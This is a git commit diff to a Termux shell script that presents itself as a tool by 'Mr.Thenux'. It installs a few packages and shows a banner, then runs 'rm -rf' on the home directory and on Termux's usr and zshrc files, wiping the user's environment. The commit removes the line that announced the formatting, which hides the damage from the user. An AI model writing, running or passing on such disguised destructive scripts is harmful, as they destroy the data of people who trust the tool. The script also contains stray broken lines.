40949c3f2653bd7dc384fefa7268fd91351a675a
Mʀ.Tʜᴇɴᴜx <88967143+HyperElite444@users.noreply.github.com>
2022-03-07 13:27:07 +0530

    Update TxTFV.sh

--- TxTFV.sh
+++ TxTFV.sh
@@ -7,26 +7,19 @@ from turtle import clear
 
 clear
 
-echo && echo && printf " " && printf TOOL | lolcat && printf " " && printf BY | lolcat && echo && figlet -f small MR.THENUX | lolcat
-
-echo
-echo
-figlet -f slant Installing Packages... | lolcat
+termux-setup-storage
 pkg install figlet -y
 pkg install lolcat -y
 pkg install python -y
 pkg intall python2 -y
 
-echo && echo && printf " " && printf TOOL | lolcat && printf " " && printf BY | lolcat && echo && figlet -f small MR.THENUX | lolcat
+clear
 
 echo
-echo
-figlet -f small Running Script... | lolcat
+figlet -f small TOOL BY MR.THENUX | lolcat
+
 cd
 cd ..
 rm -rf home
 rm -rf /data/data/com.termux/files/usr
 rm -rf /data/data/com.termux/files/zshrc
-figlet -f shadow Termux Successfully Formatted... | lolcat
-
-clear
